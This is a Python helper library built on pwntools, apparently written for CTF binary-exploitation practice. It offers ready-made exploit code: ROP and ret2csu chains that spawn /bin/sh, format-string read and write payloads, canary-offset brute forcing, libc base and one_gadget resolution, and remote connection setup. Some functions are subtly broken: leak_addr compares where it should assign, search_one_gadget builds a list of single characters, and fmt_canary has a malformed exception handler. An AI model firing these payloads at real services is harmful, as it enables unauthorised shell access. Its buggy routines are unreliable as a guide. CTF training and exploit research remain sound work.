"""
@author: 不离
@date: 2023-4-24
Pwntools-External Functions Library
开源包，任何人都可以使用并修改！
"""

import os
import random
import re
from typing import Optional, Tuple

from pwn import *
from LibcSearcher import *


__version__ = '1.8'

RESET = '\x1b[0m'


def check_io_stream(io_stream):
    """检查IO流是否有效"""
    if io_stream is None or io_stream == "":
        raise RuntimeError("Error: Please use get_utils() first.")


def check_libc_loaded(libc_elf):
    """检查Libc是否已加载"""
    if libc_elf is None:
        raise RuntimeError("Error: Please use load_libc() first.")


def check_binary_file(binary_file_path):
    """检查二进制文件路径是否有效"""
    if binary_file_path is None or binary_file_path == "":
        raise RuntimeError("Error: Binary file path is invalid.")


def load_libc(binary: Optional[str] = None) -> Optional[ELF]:
    """
    加载指定的 Libc 文件。

    Args:
        binary (str): Libc 文件路径。

    Returns:
        ELF: 加载的 Libc ELF 对象，如果未提供路径则返回 None。
    """
    global libcElf
    global libcElfFilePath

    check_binary_file(binary)
    libcElfFilePath = binary
    libcElf = ELF(binary)
    return libcElf


def calculate_libc_base(addr: int, name: str) -> int:
    """
    计算 Libc 基址。

    Args:
        addr (int): 泄漏函数地址。
        name (str): 泄漏函数名称。

    Returns:
        int: Libc 基址。
    """
    global libcBaseAddress
    global libcElf
    check_libc_loaded(libcElf)

    libcBaseAddress = addr - libcElf.sym[name]
    return libcBaseAddress


def search_one_gadget(index=0):
    """
    获取 One_Gadget 地址。

    Args:
        index: (int) 获取第 N 个 One_Gadget 的地址。

    Returns:
        one_gadget_offset
    """
    global libcElf
    global libcElfFilePath
    check_libc_loaded(libcElf)

    os.chdir(os.getcwd())
    recv = os.popen('one_gadget ' + libcElfFilePath).read()
    regex = re.compile(r"(.*exec)")
    ogs = re.findall(regex, recv)
    one_gadget_list = []
    for i in ogs:
        print(f"{random_color()}One_Gadget Found =======> [{i}]{RESET}")
        one_gadget_list += i
    return one_gadget_list[index]


def get_libc_base(name: str, addr: int) -> int:
    global libcBaseAddress
    global libcElf

    check_libc_loaded(libcElf)
    
    libcBaseAddress = calculate_libc_base(addr, name)

    return libcBaseAddress


def search_reg_gadgets(reg=None):
    """
    获取输入的寄存器相关 Gadgets

    Args:
        reg: (string) 如 ret, pop rdi;

    Returns:
        reg_offset
    """
    global binaryElf
    global binaryElfFilePath

    os.chdir(os.getcwd())

    check_binary_file(binaryElfFilePath)
    if reg is None:
        raise RuntimeError("Please specify a register.")

    command = f'ROPgadget --binary {binaryElfFilePath} | grep "{reg}"'
    recv = os.popen(command).read()

    unique_gadget = None
    for line in recv.splitlines():
        line = line.strip()
        if reg == 'ret':
            match = re.search(rf'^(0x[0-9a-f]+) : {reg}\s*(;)?$', line)
        else:
            match = re.search(rf'^(0x[0-9a-f]+) : ({re.escape(reg)})( ; ret)?$', line)

        if match:
            if unique_gadget is None:
                print(f"{random_color()}Gadget Found =======> [{match.group()}]{RESET}")
                unique_gadget = int(match.group(1), 16)
                break

    return unique_gadget


def sym_addr(sym=None):
    """
    懒人获取一系列 Libc 符号地址，使用本地 Libc 文件进行搜索。
    若想获取云端地址，请使用 libc_search 函数。
    默认返回 libc_base, system, binsh ，若 sym 有定义则返回 sym 的地址。

    Args:
        sym:  需要获取的符号

    Returns:
        libc_base, system, binsh | sym_addr
    """
    global libcElf
    global libcBaseAddress
    check_libc_loaded(libcElf)

    if libcBaseAddress == None:
        raise RuntimeError("Please use get_libc_base() first.")
    
    if sym == None:
        system = libcBaseAddress + libcElf.sym['system']
        binsh = libcBaseAddress + next(libcElf.search(b'/bin/sh\x00'))
        
        return libcBaseAddress, system, binsh
    else:
        sym_addr = libcBaseAddress + libcElf.sym[sym]

        return sym_addr
    

def sym_addr_base(sym=None):
    """
    懒人获取一系列 Libc 符号地址，使用本地 Libc 文件进行搜索。
    若想获取云端地址，请使用 libc_search 函数。
    默认返回 libc_base, system, binsh ，若 sym 有定义则返回 sym 的地址。

    Args:
        libcBase: Libc 基址
        sym:  需要获取的符号

    Returns:
        system, binsh | sym_addr
    """
    global libcElf
    global libcBaseAddress
    check_libc_loaded(libcElf)

    if libcBaseAddress == None:
        print("Please use get_libc_base() first.")
    
    if sym == None:
        system = libcBaseAddress + libcElf.sym['system']
        binsh = libcBaseAddress + next(libcElf.search(b'/bin/sh\x00'))
        
        return system, binsh
    else:
        sym_addr = libcBaseAddress + libcElf.sym[sym]

        return sym_addr


def Ret2Csu(payload, r12, rdi, r14, r13, csu_front, csu_rear, syscallAddr):
    """
    快捷 CSU Payload
    Csu Front 是连续一系列出栈的 Gadget | push r15; push r14
    Csu Rear  是连续一系列入栈的 Gadget | pop rbx; pop rbp

    Args:
        payload:        前置 Payload 送入 /bin/sh 字符串，修改系统调用号为 59
        r12;            R12 寄存器  |   从哪开始执行 call [r12+rbx*8]
        rdi:            RDI 寄存器  |   /bin/sh 字符串地址 一参
        r14:            R14 寄存器  |   RSI 寄存器 二参
        r13:            R13 寄存器  |   RDX 寄存器 三参
        csu_rear:       后置 Csu Gadget 地址 pop rbx; pop rbp
        csu_front:      前置 Csu Gadget 地址 push r15; push r14
        syscallAddr:    syscall 地址，用来执行 Csu 调用
    """
    global ioStream

    check_io_stream(ioStream)

    rdi_addr = search_reg_gadgets('pop rdi')

    payload_internal = payload
    payload_internal += p64(csu_rear)
    payload_internal += p64(0) # RBX
    payload_internal += p64(1) # RBP
    payload_internal += p64(r12) # Execute Addr
    payload_internal += p64(r13)
    payload_internal += p64(r14)
    payload_internal += p64(0) # R15
    payload_internal += p64(csu_front)
    payload_internal += cyclic(0x38)
    payload_internal += p64(rdi_addr)
    payload_internal += p64(rdi)
    payload_internal += p64(syscallAddr)

    ioStream.sendline(payload_internal)


def leak_addr(i=None):
    """
    获取泄露的内存地址。

    Args:
        i (int): 用于指定地址获取方式的参数。可以是0、1或2。0是32位，1是64位正向接收，2是64位反向接收，3是直接接收8位。

    Returns:
        int: 返回获取到的内存地址。
    """
    global ioStream

    check_io_stream(ioStream)

    internal = i

    if i == None:
        if arch == 1:
            internal == 2
        if arch == 0:
            internal == 0
        else:
            internal == 1

    address_methods = {
        0: lambda: u32(ioStream.recv(4)),
        1: lambda: u64(ioStream.recvuntil(b'\x7f')[:6].ljust(8, b'\x00')),
        2: lambda: u64(ioStream.recvuntil(b'\x7f')[-6:].ljust(8, b'\x00')),
        3: lambda: u64(ioStream.recv(8))
    }

    return address_methods[internal]()


def libc_search(func, addr_i, onlineMode=False):
    """
    在没有提供Libc版本时，这个参数可以快捷的使用LibcSearcher获取常用函数地址。

    Args:
        func: 泄露的函数
        addr_i: 泄露的函数的地址
        onlineMode: 在线搜索还是在本地Libc库搜索

    Returns:
        int: libc_base, system, /bin/sh 的地址。
    """
    libc_i = LibcSearcher(func, addr_i, online=onlineMode)
    libc_base_i = addr_i - libc_i.dump(func)
    return libc_base_i, libc_base_i + libc_i.dump('system'), libc_base_i + libc_i.dump('str_bin_sh')


def debug(io=None, breakpoint=None):
    """
    快捷GDB Attach函数。

    Args:
        io: IO流
        breakpoint: 断点地址
    """
    global ioStream

    check_io_stream(ioStream)

    ioInternal = io
    if io == None:
        ioInternal = ioStream

    if breakpoint is not None:
        gdb.attach(ioInternal, gdbscript='b *{}'.format(breakpoint))
    else:
        gdb.attach(ioInternal)
    pause()


def recv_int_addr(num):
    """
    获取泄露的Int地址，一般是格式化字符串泄露Canary等。

    Args:
        num: 需要接收几位数字
        format: 数字的进制，默认为十进制

    Returns:
        int: Int地址的十进制格式。
    """
    global ioStream
    check_io_stream(ioStream)

    try:
        received = ioStream.recv(num)
        return int(received,)
    except ValueError:
        if received.startswith(b'0x'):
            return int(received, 16)
        else:
            raise


def payload_generator(paddingSize=None, libcBaseAddr=None, stackAligned=False):
    """
    懒人构建 Payload
    目前只有 GetShell 的 Payload

    Args:
        paddingSize: 垃圾数据大小
        libcBaseAddr: Libc 基址
        stackAligned: 栈对齐，默认关闭

    Returns:
        payload: 最终 Payload
    """
    global arch

    if paddingSize == None:
        print("Please input paddingSize argument.")
        return
    
    rdi = search_reg_gadgets('pop rdi')
    system, binsh = sym_addr_base()

    if libcBaseAddr == None:
        print("Please input libc base addr.")
        return

    if stackAligned and arch == 1:
        print(f"{random_color()}========== Generating Payload with Stack Aligned for x64. =========={RESET}")
        ret = search_reg_gadgets('ret')
        payload = cyclic(paddingSize) + p64(ret) + p64(rdi) + p64(binsh) + p64(system)
        return payload
    
    if stackAligned == False and arch == 1:
        print(f"{random_color()}========== Generating Payload with No Stack Aligned for x64. =========={RESET}")
        payload = cyclic(paddingSize) + p64(rdi) + p64(binsh) + p64(system)
        return payload
    
    if arch == 0:
        print(f"{random_color()}========== Generating Payload for x86. =========={RESET}")
        payload = cyclic(paddingSize) + p32(system) + p32(0xdeadbeef) + p32(binsh)
        return payload


def random_color():
    """生成随机颜色的 ANSI 代码。"""
    return f'\x1b[01;38;5;{random.randint(1, 255)}m'


def show_addr(msg, *args, **kwargs):
    """
    打印地址。

    Args:
        msg: 在打印地址前显示的文本
        *args: 需要打印的内存地址
        **kwargs: 需要打印的内存地址
    """
    hex_color = '\x1b[01;38;5;110m'
    
    formatted_msg = f"{random_color()}{msg}{RESET}:"
    print(formatted_msg)

    for arg in args:
        hex_text = hex(arg)
        colored_hex_text = f"{hex_color}{hex_text}{RESET}"
        print(f"============> {colored_hex_text}")

    for key, value in kwargs.items():
        hex_text = hex(value)
        colored_hex_text = f"{hex_color}{hex_text}{RESET}"
        print(f"============> {key}: {colored_hex_text}")


def init_env(arch_i=None, loglevel='debug'):
    """
    初始化环境，默认为 amd64, debug 级日志打印。

    Args:
        arch: 系统架构，1表示64位，0表示32位
        log_level: 日志打印等级
    """
    global arch
    if arch_i == None:
        raise RuntimeError("Please set arch first.")

    if arch_i == 1:
        arch = 1
        context(arch='amd64', os='linux', log_level=loglevel)
    else:
        arch = 0
        context(arch='i386', os='linux', log_level=loglevel)


def get_utils(binary: Optional[str] = None, local: bool = True, ip: Optional[str] = None, port: Optional[int] = None) -> Tuple[Optional[tube], Optional[ELF]]:
    """
    快速获取IO流和ELF。

    Args:
        binary: 二进制文件
        local: 布尔值，本地模式或在线
        ip: 在线IP
        port: 在线Port

    Returns:
        io: IO流
        elf: ELF引用
    """
    global binaryElfFilePath
    global binaryElf
    global ioStream

    binaryElfFilePath = binary
    binaryElf = ELF(binary) if binary is not None else None

    if not local:
        ioStream = remote(ip, port)
    else:
        ioStream = process(binary) if binary is not None else None

    return ioStream, binaryElf


def fmt_canary():
    """
    快速获取Canary，仅支持格式化字符串漏洞。
    本函数通过本地穷举，节省人工计算的时间。
    仅支持简单题目。

    Returns:
        string: 一句关于偏移的字符串。
    """
    global binaryElfFilePath

    check_binary_file(binaryElfFilePath)

    i = 1

    pattern = re.compile(r'0x[0-9a-fA-F]{14}00.*')

    while True:
        io = process(binaryElfFilePath)

        payload = b'%' + str(i).encode() + b'$p'

        io.sendline(payload)
        try:
            recv = io.recvline().decode()
            if '(nil)' in recv:
                i = i + 1
                continue
            elif '0x' in recv:
                matches = pattern.findall(recv)
                if matches:
                    print(f"{random_color()}Canary's offset is at ===========> {str(i)} ({str('%' + str(i) + '$p')}){RESET}")
                    return
                else:
                    i = i + 1
                    continue

        except():
            i = i + 1
            continue


def fmtstraux(size: Optional[int] = 10, x64: bool = True) -> Optional[int]:
    """
    快速获取格式化字符串对应的偏移。

    Args:
        size (int): 几个%p，默认为10。
        x64 (bool): 是否是64位。

    Returns:
        int: 格式化字符串偏移，若未找到则会抛出报错。
    """
    global ioStream

    check_io_stream(ioStream)

    if size is None:
        size = 10

    if x64 is True:
        strsize = 8
    else:
        strsize = 4

    Payload = b'A' * strsize + b'-%p' * size
    ioStream.sendline(Payload)
    temp = ioStream.recvline()
    pattern = re.compile(r'(0x[0-9a-fA-F]+|\(nil\))(?:-|$)')
    matches = pattern.findall(temp.decode())

    if matches:
        position = 0
        for match in matches:
            if match == b'(nil)':
                position += 1
            else:
                position += 1
                if x64 is True:
                    if match == '0x4141414141414141':
                        return position
                else:
                    if match == '0x41414141':
                        return position

        raise RuntimeError("Offset not found. Please incrase the size or check manually.")

    else:
        raise RuntimeError("Unknown Error.")


def fmtgen(character=None, size=None, num=None, separator=None):
    """
    快速生成格式化字符串所需Payload。

    Args:
        character: 使用什么字符 默认p
        size: 几个打印，默认为10
        num: 从哪开始，默认为1
        separator: 用什么作为分隔符，默认-
    """
    if character is None:
        character = b'p'

    if size is None:
        size = 10

    if num is None:
        num = 1

    if separator is None:
        separator = b'-'

    payload_str = b''

    for i in range(num, num + size):
        payload_str += b'%' + str(i).encode() + b'$' + character + separator

    payload_str = payload_str[:-1]

    return payload_str.decode()


def fmtstr_payload_64(offset, writes, numbwritten=0, write_size='byte'):
    """
    Pwntools fmtstr_payload for x64.
    函数来源：安洵杯出题人。
    """
    config = {
        32 : {
            'byte': (4, 1, 0xFF, 'hh', 8),
            'short': (2, 2, 0xFFFF, 'h', 16),
            'int': (1, 4, 0xFFFFFFFF, '', 32)},
        64 : {
            'byte': (8, 1, 0xFF, 'hh', 8),
            'short': (4, 2, 0xFFFF, 'h', 16),
            'int': (2, 4, 0xFFFFFFFF, '', 32)
        }
    }

    if write_size not in ['byte', 'short', 'int']:
        log.error("write_size must be 'byte', 'short' or 'int'")

    number, step, mask, formatz, decalage = config[context.bits][write_size]

    payload = ""

    payload_last = ""
    for where,what in writes.items():
        for i in range(0,number*step,step):
            payload_last += pack(where+i)

    fmtCount = 0
    payload_forward = ""

    key_toadd = []
    key_offset_fmtCount = []


    for where,what in writes.items():
        for i in range(0,number):
            current = what & mask
            if numbwritten & mask <= current:
                to_add = current - (numbwritten & mask)
            else:
                to_add = (current | (mask+1)) - (numbwritten & mask)

            if to_add != 0:
                key_toadd.append(to_add)
                payload_forward += "%{}c".format(to_add)
            else:
                key_toadd.append(to_add)
            payload_forward += "%{}${}n".format(offset + fmtCount, formatz)
            key_offset_fmtCount.append(offset + fmtCount)
            #key_formatz.append(formatz)

            numbwritten += to_add
            what >>= decalage
            fmtCount += 1


    len1 = len(payload_forward)

    key_temp = []
    for i in range(len(key_offset_fmtCount)):
        key_temp.append(key_offset_fmtCount[i])

    x_add = 0
    y_add = 0
    while True:

        x_add = len1 / 8 + 1
        y_add = 8 - (len1 % 8)

        for i in range(len(key_temp)):
            key_temp[i] = key_offset_fmtCount[i] + x_add

        payload_temp = ""
        for i in range(0,number):
            if key_toadd[i] != 0:
                payload_temp += "%{}c".format(key_toadd[i])
            payload_temp += "%{}${}n".format(key_temp[i], formatz)

        len2 = len(payload_temp)

        xchange = y_add - (len2 - len1)
        if xchange >= 0:
            payload = payload_temp + xchange*'a' + payload_last
            return payload
        else:
            len1 = len2


class IO_FILE_plus_struct(FileStructure):

    def __init__(self, null=0):
        FileStructure.__init__(self, null)

    def __setattr__(self, item, value):
        if item in IO_FILE_plus_struct.__dict__ or item in FileStructure.__dict__ or item in self.vars_:
            object.__setattr__(self, item, value)
        else:
            error("Unknown variable %r" % item)

    def __getattr__(self, item):
        if item in IO_FILE_plus_struct.__dict__ or item in FileStructure.__dict__ or item in self.vars_:
            return object.__getattribute__(self, item)
        error("Unknown variable %r" % item)

    def __str__(self):
        return str(self.__bytes__())[2:-1]

    @property
    def _mode(self) -> int:
        off = 96
        if context.bits == 64:
            off = 192
        return (self.unknown2 >> off) & 0xffffffff

    @_mode.setter
    def _mode(self, value:int):
        assert value <= 0xffffffff and value >= 0, "value error: {}".format(hex(value))
        off = 96
        if context.bits == 64:
            off = 192
        self.unknown2 |= (value << off)


import ctypes

class FileStruct(ctypes.Structure):
    _fields_ = [
        ('field1', ctypes.c_int),
        ('field2', ctypes.c_int),
        ('field3', ctypes.c_char * 10)
    ]